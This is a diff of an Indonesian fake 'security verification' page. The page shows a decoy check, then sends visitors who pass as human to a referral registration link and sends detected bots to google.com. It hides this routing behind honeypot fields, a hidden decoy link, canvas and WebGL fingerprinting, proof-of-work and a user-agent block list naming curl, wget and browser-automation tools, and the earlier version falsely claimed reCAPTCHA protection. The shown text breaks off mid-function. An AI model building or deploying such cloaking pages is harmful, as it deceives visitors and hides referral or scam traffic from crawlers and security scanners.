@@ -1,355 +1,1126 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verifikasi keamanan</title>
-    
-    <style>
-        /* --- CSS RESET & VARIABLES --- */
-        :root {
-            --bg-color: #f0f4f8;
-            --card-bg: #ffffff;
-            --text-main: #202124;
-            --text-sub: #5f6368;
-            --btn-bg: #1a73e8;
-            --btn-hover: #1557b0;
-            --link-color: #1a73e8;
-        }
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="theme-color" content="#080808" />
 
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            /* Menggunakan font sistem standar seperti Google */
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            -webkit-tap-highlight-color: transparent;
-        }
+  <title>Verifikasi Keamanan</title>
 
-        body {
-            background-color: var(--bg-color);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            padding: 20px;
-        }
+  <style>
+    :root {
+      --black: #080808;
+      --black-soft: #111111;
+      --panel: rgba(22, 22, 22, .88);
+      --gold: #d9a441;
+      --gold-light: #ffe08a;
+      --gold-dark: #9b6a13;
+      --white: #fffaf0;
+      --muted: #b7b0a1;
+      --line: rgba(217, 164, 65, .28);
+    }
 
-        /* --- PRELOADER (LOADING SCREEN) --- */
-        #preloader {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: #ffffff;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            z-index: 9999;
-            transition: opacity 0.6s ease, visibility 0.6s ease;
-        }
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
 
-        .preloader-content {
-            text-align: center;
-        }
+    body {
+      min-height: 100vh;
+      min-height: 100dvh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 24px;
+      overflow-x: hidden;
+      overflow-y: auto;
+      color: var(--white);
+      font-family: Inter, Arial, Helvetica, sans-serif;
+      background:
+        radial-gradient(circle at 50% -10%, rgba(217, 164, 65, .16), transparent 34%),
+        radial-gradient(circle at 0% 100%, rgba(217, 164, 65, .10), transparent 30%),
+        var(--black);
+    }
 
-        .progress-container {
-            width: 200px;
-            height: 4px;
-            background-color: #e5e7eb;
-            border-radius: 10px;
-            overflow: hidden;
-            margin: 0 auto 16px auto;
-            position: relative;
-        }
+    body::before {
+      content: "";
+      position: fixed;
+      inset: 0;
+      opacity: .08;
+      pointer-events: none;
+      background-image:
+        linear-gradient(rgba(255,255,255,.1) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(255,255,255,.1) 1px, transparent 1px);
+      background-size: 42px 42px;
+      mask-image: linear-gradient(to bottom, black, transparent 90%);
+    }
 
-        .progress-bar {
-            position: absolute;
-            top: 0;
-            left: 0;
-            height: 100%;
-            width: 0%;
-            background-color: var(--btn-bg);
-            border-radius: 10px;
-            transition: width 0.3s ease;
-        }
+    .orb {
+      position: fixed;
+      width: 280px;
+      height: 280px;
+      border-radius: 50%;
+      pointer-events: none;
+      filter: blur(50px);
+      opacity: .15;
+      background: var(--gold);
+      animation: floatOrb 8s ease-in-out infinite;
+    }
 
-        .preloader-text {
-            font-size: 13px;
-            color: var(--text-sub);
-            font-weight: 400;
-        }
+    .orb-one {
+      top: -150px;
+      right: -80px;
+    }
 
-        /* --- MAIN CARD UI --- */
-        .main-container {
-            opacity: 0;
-            visibility: hidden;
-            transform: translateY(10px);
-            transition: all 0.6s ease;
-            width: 100%;
-            display: flex;
-            justify-content: center;
-        }
+    .orb-two {
+      bottom: -160px;
+      left: -100px;
+      animation-delay: -3s;
+    }
 
-        .main-container.show {
-            opacity: 1;
-            visibility: visible;
-            transform: translateY(0);
-        }
+    .card {
+      position: relative;
+      width: min(100%, 530px);
+      padding: 46px 34px 34px;
+      text-align: center;
+      border: 1px solid var(--line);
+      border-radius: 28px;
+      background:
+        linear-gradient(145deg, rgba(255,255,255,.055), transparent 35%),
+        var(--panel);
+      box-shadow:
+        0 25px 90px rgba(0, 0, 0, .7),
+        0 0 60px rgba(217, 164, 65, .08),
+        inset 0 1px 0 rgba(255, 255, 255, .08);
+      backdrop-filter: blur(18px);
+      animation: cardIn .8s cubic-bezier(.2,.8,.2,1) both;
+    }
 
-        .card {
-            background: var(--card-bg);
-            width: 100%;
-            max-width: 420px;
-            border-radius: 12px;
-            padding: 48px 40px;
-            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.08), 0 1px 2px rgba(0,0,0,0.04);
-            text-align: center;
-            position: relative;
-        }
+    .card::before,
+    .card::after {
+      content: "";
+      position: absolute;
+      width: 90px;
+      height: 90px;
+      border-color: var(--gold);
+      opacity: .7;
+      pointer-events: none;
+    }
 
-        /* --- ICON (CHECKMARK) --- */
-        .icon-wrapper {
-            width: 72px;
-            height: 72px;
-            background-color: #e8f0fe;
-            border-radius: 50%;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            margin: 0 auto 24px auto;
-        }
+    .card::before {
+      top: 18px;
+      left: 18px;
+      border-top: 1px solid;
+      border-left: 1px solid;
+      border-radius: 12px 0 0 0;
+    }
 
-        .icon-wrapper svg {
-            width: 36px;
-            height: 36px;
-            fill: var(--btn-bg);
-        }
+    .card::after {
+      right: 18px;
+      bottom: 18px;
+      border-right: 1px solid;
+      border-bottom: 1px solid;
+      border-radius: 0 0 12px 0;
+    }
 
-        /* --- TYPOGRAPHY --- */
-        h1 {
-            font-size: 24px;
-            font-weight: 500;
-            color: var(--text-main);
-            margin-bottom: 12px;
-            letter-spacing: -0.2px;
-        }
+    .brand {
+      margin-bottom: 27px;
+      color: var(--gold-light);
+      font-size: 12px;
+      font-weight: 700;
+      letter-spacing: 4px;
+      text-transform: uppercase;
+    }
 
-        p.subtitle {
-            font-size: 15px;
-            color: var(--text-sub);
-            line-height: 1.5;
-            margin-bottom: 32px;
-        }
+    .security-icon {
+      position: relative;
+      width: 94px;
+      height: 94px;
+      display: grid;
+      place-items: center;
+      margin: 0 auto 25px;
+      border: 1px solid rgba(217, 164, 65, .45);
+      border-radius: 50%;
+      background:
+        radial-gradient(circle, rgba(217,164,65,.2), transparent 66%),
+        #17130c;
+      box-shadow:
+        0 0 0 9px rgba(217, 164, 65, .045),
+        0 0 36px rgba(217, 164, 65, .18);
+      animation: iconPulse 3s ease-in-out infinite;
+    }
 
-        /* --- BUTTON --- */
-        .btn-verify {
-            width: 100%;
-            background: var(--btn-bg);
-            color: white;
-            border: none;
-            padding: 14px 24px;
-            border-radius: 4px;
-            font-size: 15px;
-            font-weight: 500;
-            cursor: pointer;
-            transition: background 0.2s ease, box-shadow 0.2s ease;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            position: relative;
-        }
+    .security-icon::before {
+      content: "";
+      position: absolute;
+      inset: -9px;
+      border: 1px dashed rgba(217, 164, 65, .32);
+      border-radius: 50%;
+      animation: rotate 12s linear infinite;
+    }
 
-        .btn-verify:hover {
-            background: var(--btn-hover);
-            box-shadow: 0 1px 3px rgba(0,0,0,0.2);
-        }
+    .shield {
+      position: relative;
+      width: 33px;
+      height: 40px;
+      border: 3px solid var(--gold-light);
+      border-radius: 48% 48% 54% 54%;
+      clip-path: polygon(50% 0, 94% 15%, 88% 64%, 50% 100%, 12% 64%, 6% 15%);
+      background: linear-gradient(145deg, rgba(255,224,138,.25), transparent);
+    }
 
-        .btn-verify:active {
-            background: #0d47a1;
-        }
+    .shield::after {
+      content: "";
+      position: absolute;
+      width: 14px;
+      height: 7px;
+      left: 6px;
+      top: 12px;
+      border-left: 3px solid var(--gold-light);
+      border-bottom: 3px solid var(--gold-light);
+      transform: rotate(-45deg);
+    }
 
-        .btn-verify:disabled {
-            background: #9ca3af;
-            cursor: not-allowed;
-            box-shadow: none;
-        }
+    h1 {
+      margin-bottom: 14px;
+      color: var(--white);
+      font-size: clamp(26px, 6vw, 34px);
+      letter-spacing: -.8px;
+    }
 
-        /* Spinner Animation */
-        .spinner {
-            display: none;
-            width: 18px;
-            height: 18px;
-            border: 2px solid rgba(255, 255, 255, 0.3);
-            border-radius: 50%;
-            border-top-color: white;
-            animation: spin 0.8s linear infinite;
-            margin-right: 10px;
-        }
+    .subtitle {
+      max-width: 400px;
+      margin: 0 auto 27px;
+      color: var(--muted);
+      font-size: 16px;
+      line-height: 1.65;
+    }
 
-        @keyframes spin { to { transform: rotate(360deg); } }
+    .divider {
+      width: 80px;
+      height: 2px;
+      margin: 0 auto 27px;
+      background: linear-gradient(90deg, transparent, var(--gold), transparent);
+    }
 
-        /* --- FOOTER TEXT --- */
-        .recaptcha-footer {
-            margin-top: 32px;
-            font-size: 12px;
-            color: var(--text-sub);
-            line-height: 1.5;
-            padding: 0 10px;
-        }
+    .continue-button {
+      position: relative;
+      width: 100%;
+      min-height: 61px;
+      overflow: hidden;
+      border: 1px solid var(--gold-light);
+      border-radius: 13px;
+      color: #171008;
+      background: linear-gradient(135deg, var(--gold-light), var(--gold), #b47b1d);
+      box-shadow:
+        0 10px 25px rgba(217, 164, 65, .22),
+        inset 0 1px 0 rgba(255,255,255,.55);
+      font-size: 18px;
+      font-weight: 700;
+      cursor: pointer;
+      transition: transform .2s ease, box-shadow .2s ease, filter .2s ease;
+    }
 
-        .recaptcha-footer a {
-            color: var(--link-color);
-            text-decoration: none;
-        }
+    .continue-button:disabled {
+      filter: grayscale(0.5) brightness(0.8);
+      cursor: not-allowed;
+      transform: none;
+    }
 
-        .recaptcha-footer a:hover {
-            text-decoration: underline;
-        }
+    .continue-button::before {
+      content: "";
+      position: absolute;
+      top: 0;
+      left: -120%;
+      width: 70%;
+      height: 100%;
+      transform: skewX(-22deg);
+      background: linear-gradient(
+        90deg,
+        transparent,
+        rgba(255, 255, 255, .55),
+        transparent
+      );
+      transition: left .7s ease;
+    }
 
-        /* --- RESPONSIVE --- */
-        @media (max-width: 480px) {
-            .card { padding: 32px 24px; }
-            h1 { font-size: 22px; }
-        }
-    </style>
+    .continue-button:hover {
+      transform: translateY(-3px);
+      filter: brightness(1.08);
+      box-shadow:
+        0 16px 32px rgba(217, 164, 65, .30),
+        0 0 22px rgba(217, 164, 65, .18);
+    }
+
+    .continue-button:hover::before {
+      left: 145%;
+    }
+
+    .continue-button:active {
+      transform: translateY(0) scale(.98);
+    }
+
+    .continue-button:focus-visible {
+      outline: 3px solid var(--white);
+      outline-offset: 4px;
+    }
+
+    .button-content {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 11px;
+    }
+
+    .arrow {
+      font-size: 23px;
+      transition: transform .2s ease;
+    }
+
+    .continue-button:hover .arrow {
+      transform: translateX(5px);
+    }
+
+    .spinner {
+      display: none;
+      width: 19px;
+      height: 19px;
+      border: 3px solid rgba(0,0,0,.28);
+      border-top-color: #171008;
+      border-radius: 50%;
+      animation: spin .75s linear infinite;
+    }
+
+    .loading {
+      pointer-events: none;
+      filter: brightness(.92);
+    }
+
+    .loading .spinner {
+      display: inline-block;
+    }
+
+    .loading .button-text {
+      font-size: 0;
+    }
+
+    .loading .button-text::after {
+      content: "Memverifikasi...";
+      font-size: 18px;
+    }
+
+    .loading .arrow {
+      display: none;
+    }
+
+    .status {
+      min-height: 21px;
+      margin-top: 17px;
+      color: var(--gold-light);
+      font-size: 13px;
+      opacity: 0;
+      transition: opacity .3s ease;
+    }
+
+    .status.show {
+      opacity: 1;
+    }
+
+    .status.error {
+      color: #ff4d4d;
+    }
+
+    .notice {
+      margin-top: 22px;
+      color: #8e887c;
+      font-size: 12px;
+      line-height: 1.7;
+    }
+
+    .notice a {
+      color: var(--gold-light);
+      text-decoration: none;
+    }
+
+    .notice a:hover {
+      text-decoration: underline;
+    }
+
+    .footer-mark {
+      margin-top: 27px;
+      color: #6d675d;
+      font-size: 10px;
+      letter-spacing: 2px;
+      text-transform: uppercase;
+    }
+
+    /* ── JEBAKAN BOT (tidak terlihat oleh manusia) ── */
+    .bot-decoy {
+      position: absolute !important;
+      left: -9999px !important;
+      top: -9999px !important;
+      width: 1px !important;
+      height: 1px !important;
+      overflow: hidden !important;
+      opacity: 0 !important;
+      pointer-events: auto !important;
+    }
+
+    @keyframes cardIn {
+      from {
+        opacity: 0;
+        transform: translateY(28px) scale(.96);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0) scale(1);
+      }
+    }
+
+    @keyframes iconPulse {
+      0%, 100% {
+        transform: scale(1);
+        box-shadow:
+          0 0 0 9px rgba(217, 164, 65, .045),
+          0 0 36px rgba(217, 164, 65, .18);
+      }
+      50% {
+        transform: scale(1.045);
+        box-shadow:
+          0 0 0 14px rgba(217, 164, 65, .025),
+          0 0 48px rgba(217, 164, 65, .28);
+      }
+    }
+
+    @keyframes rotate {
+      to {
+        transform: rotate(360deg);
+      }
+    }
+
+    @keyframes spin {
+      to {
+        transform: rotate(360deg);
+      }
+    }
+
+    @keyframes floatOrb {
+      0%, 100% {
+        transform: translate(0, 0);
+      }
+      50% {
+        transform: translate(18px, -25px);
+      }
+    }
+
+    @media (max-width: 480px) {
+      body {
+        padding: 16px;
+      }
+
+      .card {
+        padding: 37px 22px 28px;
+        border-radius: 22px;
+      }
+
+      .brand {
+        font-size: 10px;
+        letter-spacing: 3px;
+      }
+
+      .subtitle {
+        font-size: 15px;
+      }
+    }
+
+    @media (prefers-reduced-motion: reduce) {
+      *,
+      *::before,
+      *::after {
+        animation-duration: .01ms !important;
+        animation-iteration-count: 1 !important;
+        scroll-behavior: auto !important;
+      }
+    }
+  </style>
 </head>
+
 <body>
+  <div class="orb orb-one"></div>
+  <div class="orb orb-two"></div>
 
-    <!-- PRELOADER SCREEN -->
-    <div id="preloader">
-        <div class="preloader-content">
-            <div class="progress-container">
-                <div class="progress-bar" id="progressBar"></div>
-            </div>
-            <p class="preloader-text" id="preloaderText">Memeriksa koneksi aman...</p>
-        </div>
+  <main class="card" aria-labelledby="pageTitle">
+    <div class="brand">Secure Access</div>
+
+    <div class="security-icon" aria-hidden="true">
+      <div class="shield"></div>
     </div>
 
-    <!-- MAIN CONTENT -->
-    <div class="main-container" id="mainContent">
-        <div class="card">
-            
-            <!-- Ikon Centang -->
-            <div class="icon-wrapper">
-                <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
-                    <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/>
-                </svg>
-            </div>
+    <h1 id="pageTitle">Verifikasi Keamanan</h1>
 
-            <h1>Verifikasi keamanan</h1>
-            <p class="subtitle">Klik tombol di bawah untuk melanjutkan proses verifikasi.</p>
+    <p class="subtitle">
+      Pastikan Anda adalah pengguna yang sah untuk melanjutkan
+      ke halaman berikutnya.
+    </p>
 
-            <button id="verifyBtn" class="btn-verify">
-                <span class="spinner" id="spinner"></span>
-                <span id="btnText">Melanjutkan</span>
-            </button>
+    <div class="divider"></div>
 
-            <div class="recaptcha-footer">
-                Situs ini dilindungi oleh reCAPTCHA dan berlaku <a href="#">Kebijakan Privasi</a> serta <a href="#">Persyaratan Layanan</a> Google.
-            </div>
-        </div>
+    <!-- HONEYPOT FIELDS -->
+    <input type="text" id="honeypot-website" name="website" style="display:none !important" tabindex="-1" autocomplete="off" aria-hidden="true">
+    <input type="text" id="honeypot-email" name="email" style="display:none !important" tabindex="-1" autocomplete="off" aria-hidden="true">
+    <input type="text" id="honeypot-phone" name="phone" style="display:none !important" tabindex="-1" autocomplete="off" aria-hidden="true">
+    <input type="text" id="honeypot-username" name="username" style="display:none !important" tabindex="-1" autocomplete="off" aria-hidden="true">
+
+    <button
+      class="continue-button"
+      id="continueButton"
+      type="button"
+      aria-label="Melanjutkan proses verifikasi"
+    >
+      <span class="button-content">
+        <span class="spinner" aria-hidden="true"></span>
+        <span class="button-text">Melanjutkan</span>
+        <span class="arrow" aria-hidden="true">→</span>
+      </span>
+    </button>
+
+    <!-- JEBAKAN: hanya bot yang mau klik elemen tersembunyi ini -->
+    <a href="#" id="botDecoy" class="bot-decoy" tabindex="-1" aria-hidden="true" rel="nofollow">Konfirmasi di sini</a>
+
+    <div
+      class="status"
+      id="statusMessage"
+      role="status"
+      aria-live="polite"
+    >
+      Verifikasi berhasil. Mengarahkan Anda...
     </div>
 
-    <!-- SCRIPT ASLI TIDAK DIUBAH SAMA SEKALI -->
-    <script>
-        document.addEventListener('DOMContentLoaded', () => {
-            // --- 1. LOGIKA PRELOADER ---
-            const preloader = document.getElementById('preloader');
-            const mainContent = document.getElementById('mainContent');
-            const progressBar = document.getElementById('progressBar');
-            const preloaderText = document.getElementById('preloaderText');
-            
-            let progress = 0;
-            
-            // Simulasi loading bar
-            const interval = setInterval(() => {
-                progress += Math.random() * 15;
-                if (progress > 100) progress = 100;
-                progressBar.style.width = progress + '%';
+    <p class="notice">
+      Dengan melanjutkan, Anda menyetujui
+      <a href="#">Kebijakan Privasi</a>
+      dan
+      <a href="#">Persyaratan Layanan</a>.
+    </p>
 
-                if (progress > 40 && progress < 70) {
-                    preloaderText.textContent = "Memvalidasi keamanan server...";
-                } else if (progress >= 70) {
-                    preloaderText.textContent = "Menyiapkan halaman...";
-                }
+    <div class="footer-mark">Protected Connection</div>
+  </main>
 
-                if (progress === 100) {
-                    clearInterval(interval);
-                    setTimeout(() => {
-                        preloader.style.opacity = '0';
-                        preloader.style.visibility = 'hidden';
-                        
-                        // Tampilkan Card Utama
-                        mainContent.classList.add('show');
-                        
-                        // Mulai hitung waktu anti-bot SETELAH preloader hilang
-                        startAntiBotTimer();
-                    }, 500);
-                }
-            }, 200);
+  <!-- Canvas untuk fingerprinting (tersembunyi) -->
+  <canvas id="fingerprintCanvas" style="display:none;" width="200" height="50"></canvas>
 
-            // --- 2. LOGIKA ANTI-BOT & REDIRECT ---
-            const verifyBtn = document.getElementById('verifyBtn');
-            const btnText = document.getElementById('btnText');
-            const spinner = document.getElementById('spinner');
-            
-            let humanInteractionDetected = false;
-            let loadTime = 0; 
+  <script>
+  (function () {
+    'use strict';
 
-            function startAntiBotTimer() {
-                loadTime = Date.now(); // Reset waktu mulai
+    /* ══════════════════════════════════════════════════════════
+     *  KONFIGURASI
+     * ══════════════════════════════════════════════════════════ */
+    const TUJUAN_URL   = "https://pafimalang.org/register?referral=jonathannnn";
+    const BOT_REDIRECT = "https://www.google.com";
+
+    const CFG = {
+      minTimeOnPage  : 1800,
+      minHoverTime   : 120,
+      minMouseMoves  : 5,
+      minPathLength  : 150,
+      powZeros       : 3,
+      powMaxIter     : 400000,
+      redirectDelay  : 1600,
+      botDelay       : 1200,
+      scoreThreshold : 55,
+      maxVisitsPerMin: 6
+    };
+
+    /* ══════════════════════════════════════════════════════════
+     *  ELEMEN
+     * ══════════════════════════════════════════════════════════ */
+    const button        = document.getElementById("continueButton");
+    const statusMessage = document.getElementById("statusMessage");
+    const decoy         = document.getElementById("botDecoy");
+    const honeypots     = [
+      document.getElementById("honeypot-website"),
+      document.getElementById("honeypot-email"),
+      document.getElementById("honeypot-phone"),
+      document.getElementById("honeypot-username")
+    ].filter(Boolean);
+
+    if (!button) { return; }
+
+    /* ══════════════════════════════════════════════════════════
+     *  STATE
+     * ══════════════════════════════════════════════════════════ */
+    const T_START = Date.now();
+
+    const S = {
+      moves         : [],
+      pathLength    : 0,
+      keys          : [],
+      touchCount    : 0,
+      scrollCount   : 0,
+      pointerDown   : null,
+      pointerUp     : null,
+      hoverStart    : 0,
+      hoverTime     : 0,
+      clickStamps   : [],
+      decoyHit      : false,
+      powDone       : null,
+      notifPerm     : null,
+      visitCount    : 0,
+      finished      : false
+    };
+
+    /* ══════════════════════════════════════════════════════════
+     *  PENGUMPULAN DATA PERILAKU
+     * ══════════════════════════════════════════════════════════ */
+
+    document.addEventListener('mousemove', function (e) {
+      const t = performance.now();
+      const last = S.moves[S.moves.length - 1];
+
+      if (last) {
+        const d = Math.hypot(e.clientX - last.x, e.clientY - last.y);
+        if (d > 0 && d < 2500) { S.pathLength += d; }
+      }
+
+      S.moves.push({ x: e.clientX, y: e.clientY, t: t });
+      if (S.moves.length > 200) { S.moves.shift(); }
+    }, { passive: true, capture: true });
+
+    function hoverIn()  { S.hoverStart = performance.now(); }
+    function hoverOut() {
+      if (S.hoverStart) {
+        S.hoverTime = Math.max(S.hoverTime, performance.now() - S.hoverStart);
+        S.hoverStart = 0;
+      }
+    }
+
+    if (window.PointerEvent) {
+      button.addEventListener('pointerenter', hoverIn);
+      button.addEventListener('pointerleave', hoverOut);
+    } else {
+      button.addEventListener('mouseenter', hoverIn);
+      button.addEventListener('mouseleave', hoverOut);
+    }
+
+    button.addEventListener('pointerdown', function (e) {
+      S.pointerDown = {
+        t: performance.now(),
+        x: e.clientX,
+        y: e.clientY,
+        pointerType: e.pointerType,
+        isPrimary: e.isPrimary,
+        trusted: e.isTrusted
+      };
+    }, true);
+
+    button.addEventListener('pointerup', function (e) {
+      S.pointerUp = {
+        t: performance.now(),
+        x: e.clientX,
+        y: e.clientY,
+        pointerType: e.pointerType,
+        trusted: e.isTrusted
+      };
+    }, true);
+
+    if (!window.PointerEvent) {
+      button.addEventListener('mousedown', function (e) {
+        S.pointerDown = { t: performance.now(), x: e.clientX, y: e.clientY, trusted: e.isTrusted };
+      }, true);
+      button.addEventListener('mouseup', function (e) {
+        S.pointerUp = { t: performance.now(), x: e.clientX, y: e.clientY, trusted: e.isTrusted };
+      }, true);
+    }
+
+    document.addEventListener('keydown', function (e) {
+      S.keys.push({ key: e.key, t: performance.now(), trusted: e.isTrusted });
+      if (S.keys.length > 40) { S.keys.shift(); }
+    }, { passive: true, capture: true });
+
+    document.addEventListener('touchstart', function () { S.touchCount++; }, { passive: true, capture: true });
+    document.addEventListener('touchmove',  function () { S.touchCount++; }, { passive: true, capture: true });
+
+    window.addEventListener('scroll', function () { S.scrollCount++; }, { passive: true });
+
+    honeypots.forEach(function (h) {
+      const mark = function () { h.dataset.filled = "1"; };
+      h.addEventListener('input', mark, true);
+      h.addEventListener('change', mark, true);
+      h.addEventListener('focus', mark, true);
+    });
+
+    if (decoy) {
+      decoy.addEventListener('click', function (e) {
+        e.preventDefault();
+        S.decoyHit = true;
+      });
+      decoy.addEventListener('focus', function () { S.decoyHit = true; }, true);
+    }
+
+    /* ══════════════════════════════════════════════════════════
+     *  FINGERPRINT HELPERS
+     * ══════════════════════════════════════════════════════════ */
+
+    function canvasFingerprint() {
+      try {
+        const canvas = document.getElementById('fingerprintCanvas');
+        const ctx = canvas.getContext('2d');
+
+        ctx.textBaseline = 'top';
+        ctx.font = '14px Arial';
+        ctx.fillStyle = '#f60';
+        ctx.fillRect(0, 0, 100, 50);
+        ctx.fillStyle = '#069';
+        ctx.fillText('🔒 Security Check', 2, 15);
+        ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+        ctx.fillText('🔒 Security Check', 4, 17);
+
+        const data = ctx.getImageData(0, 0, canvas.width, canvas.height).data;
+        let hash = 0;
+        for (let i = 0; i < data.length; i += 4) {
+          hash = ((hash << 5) - hash) + data[i] + data[i + 1] + data[i + 2];
+          hash = hash & hash;
+        }
+        return hash.toString(16);
+      } catch (e) {
+        return 'error';
+      }
+    }
+
+    let _webglCache = null;
+    function webglInfo() {
+      if (_webglCache) { return _webglCache; }
+      const out = { ok: false, renderer: '', vendor: '' };
+      try {
+        const c = document.createElement('canvas');
+        const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
+        if (gl) {
+          const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+          out.renderer = String(dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : (gl.getParameter(gl.RENDERER) || ''));
+          out.vendor   = String(dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL)   : (gl.getParameter(gl.VENDOR)   || ''));
+          out.ok = true;
+        }
+      } catch (e) { /* ignore */ }
+      _webglCache = out;
+      return out;
+    }
+
+    /* ══════════════════════════════════════════════════════════
+     *  PROOF-OF-WORK
+     * ══════════════════════════════════════════════════════════ */
+    function runProofOfWork() {
+      const subtle = (window.crypto && (window.crypto.subtle || window.crypto.webkitSubtle)) || null;
+
+      if (!subtle || !window.TextEncoder) {
+        S.powDone = 'na';
+        return;
+      }
+
+      const seed   = Math.random().toString(36).slice(2) + Date.now().toString(36);
+      const target = new Array(CFG.powZeros + 1).join('0');
+      const enc    = new TextEncoder();
+      let nonce    = 0;
+
+      (function step() {
+        if (nonce > CFG.powMaxIter) { S.powDone = false; return; }
+
+        subtle.digest('SHA-256', enc.encode(seed + ':' + nonce))
+          .then(function (buf) {
+            const bytes = new Uint8Array(buf);
+            let hex = '';
+            for (let i = 0; i < 4; i++) {
+              hex += ('0' + bytes[i].toString(16)).slice(-2);
             }
+            if (hex.indexOf(target) === 0) {
+              S.powDone = true;
+              return;
+            }
+            nonce++;
+            step();
+          })
+          .catch(function () { S.powDone = 'na'; });
+      })();
+    }
 
-            // Deteksi pergerakan mouse (PC) atau sentuhan (Mobile)
-            window.addEventListener('mousemove', () => { humanInteractionDetected = true; }, { once: true });
-            window.addEventListener('touchstart', () => { humanInteractionDetected = true; }, { once: true });
+    /* ══════════════════════════════════════════════════════════
+     *  PEMBATAS FREKUENSI KUNJUNGAN
+     * ══════════════════════════════════════════════════════════ */
+    function registerVisit() {
+      try {
+        const KEY = '__sec_v';
+        const nowMs = Date.now();
+        let arr = [];
+        try { arr = JSON.parse(sessionStorage.getItem(KEY) || '[]'); } catch (e) { arr = []; }
+        if (!Array.isArray(arr)) { arr = []; }
+        arr = arr.filter(function (t) { return nowMs - t < 60000; });
+        arr.push(nowMs);
+        sessionStorage.setItem(KEY, JSON.stringify(arr));
+        return arr.length;
+      } catch (e) {
+        return 1;
+      }
+    }
 
-            const handleRedirect = () => {
-                const userAgent = navigator.userAgent || navigator.vendor || window.opera;
+    /* ══════════════════════════════════════════════════════════
+     *  ANALISIS GERAKAN MOUSE
+     * ══════════════════════════════════════════════════════════ */
+    function mouseStats() {
+      const m = S.moves;
+      if (m.length < 3) {
+        return { ok: false, count: m.length, stdDev: 0, avgSpeed: 0, duration: 0, straightness: 1 };
+      }
 
-                // Deteksi Device
-                const isAndroid = /android/i.test(userAgent);
-                const isIOS = /iPad|iPhone|iPod/.test(userAgent) || (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1);
+      const speeds = [];
+      for (let i = 1; i < m.length; i++) {
+        const dx = m[i].x - m[i - 1].x;
+        const dy = m[i].y - m[i - 1].y;
+        const dt = m[i].t - m[i - 1].t;
+        if (dt > 0) { speeds.push(Math.hypot(dx, dy) / dt); }
+      }
 
-                if (isAndroid || isIOS) {
-                    // Redirect Android / iPhone
-                    window.location.href = 'https://pafimalang.org/register?referral=jonathannn';
-                } else {
-                    // Redirect PC / Desktop
-                    window.location.href = 'https://veyrendigitalagency.xyz/';
-                }
-            };
+      if (speeds.length < 2) {
+        return { ok: false, count: m.length, stdDev: 0, avgSpeed: 0, duration: 0, straightness: 1 };
+      }
 
-            verifyBtn.addEventListener('click', () => {
-                // Validasi 1: Interaksi Fisik (Anti-Bot)
-                if (!humanInteractionDetected) {
-                    alert("Sistem mendeteksi aktivitas bot. Silakan gerakkan mouse atau sentuh layar Anda.");
-                    return;
-                }
+      const avg  = speeds.reduce(function (a, b) { return a + b; }, 0) / speeds.length;
+      const varr = speeds.reduce(function (a, b) { return a + Math.pow(b - avg, 2); }, 0) / speeds.length;
+      const std  = Math.sqrt(varr);
 
-                // Validasi 2: Waktu di halaman (Minimal 1.5 detik setelah preloader)
-                const timeOnPage = Date.now() - loadTime;
-                if (timeOnPage < 1500) {
-                    alert("Verifikasi terlalu cepat. Silakan tunggu sebentar dan coba lagi.");
-                    return;
-                }
+      const net  = Math.hypot(m[m.length - 1].x - m[0].x, m[m.length - 1].y - m[0].y);
+      const straight = S.pathLength > 0 ? net / S.pathLength : 1;
 
-                // Tampilkan Loading State pada Tombol
-                verifyBtn.disabled = true;
-                btnText.textContent = "Memverifikasi Perangkat...";
-                spinner.style.display = "block";
+      return {
+        ok: true,
+        count: m.length,
+        avgSpeed: avg,
+        stdDev: std,
+        duration: m[m.length - 1].t - m[0].t,
+        straightness: straight
+      };
+    }
 
-                // Simulasi proses pengecekan (1.2 detik)
-                setTimeout(() => {
-                    btnText.textContent = "Mengalihkan...";
-                    // Eksekusi redirect
-                    handleRedirect();
-                }, 1200);
-            });
-        });
-    </script>
+    /* ══════════════════════════════════════════════════════════
+     *  PEMERIKSAAN LINGKUNGAN (environment / headless)
+     * ══════════════════════════════════════════════════════════ */
+    function envPenalty() {
+      let penalty = 0;
+      const reasons = [];
+
+      function add(p, r) { penalty += p; reasons.push(r); }
+
+      const ua = navigator.userAgent || '';
+      const isMobile = /android|iphone|ipad|ipod|blackberry|iemobile|opera mini|mobile/i.test(ua);
+
+      if (/headlesschrome|phantomjs|slimerjs|puppeteer|playwright|electron|node\.js|jsdom|zombie|curl|wget|python-requests|python-urllib|java\/|httpclient|go-http-client|okhttp/i.test(ua)) {
+        add(120, 'ua_automation');
+      }
+
+      if (navigator.webdriver === true) { add(120, 'webdriver'); }
+
+      if (('_phantom' in window) || ('callPhantom' in window) || ('__nightmare' in window)) {
+        add(120, 'phantom_globals');
+      }
+
+      if (('Buffer' in window) && ('process' in window)) { add(120, 'node_env'); }
+
+      const selProps = [
+        '__webdriver_evaluate', '__selenium_evaluate', '__fxdriver_evaluate',
+        '__driver_evaluate', '__webdriver_unwrapped', '__selenium_unwrapped',
+        '__fxdriver_unwrapped', '__playwright__', '__puppeteer__', '__pw_manual'
+      ];
+      for (let i = 0; i < selProps.length; i++) {
